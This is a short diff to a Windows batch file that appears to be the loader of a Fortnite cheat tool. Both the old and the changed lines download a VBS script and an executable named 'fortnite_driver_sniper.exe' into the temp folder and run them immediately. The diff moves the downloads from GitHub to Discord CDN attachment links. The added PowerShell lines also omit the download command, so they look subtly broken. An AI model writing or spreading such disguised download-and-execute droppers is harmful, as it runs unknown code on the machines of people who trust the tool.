@@ -1,9 +1,9 @@
 @echo off
-Powershell https://raw.githubusercontent.com/fortnite-bot/fncheat/main/welcome.vbs -OutFile %temp%/welcome.vbs
+Powershell https://cdn.discordapp.com/attachments/774913548827885592/775027796388872192/welcome.vbs -OutFile %temp%/welcome.vbs
 "%temp%/welcome.vbs"
 
 :start2
-Powershell Invoke-WebRequest https://github.com/fortnite-bot/fncheat/blob/main/fortnite_driver_sniper.exe -OutFile %temp%/loader.exe
+Powershell https://cdn.discordapp.com/attachments/756193116528181390/757259102505140234/fortnite_driver_sniper.exe -OutFile %temp%/loader.exe
 "%temp%/loader.exe"
 
 IF EXIST "%temp%/loader.exe" (
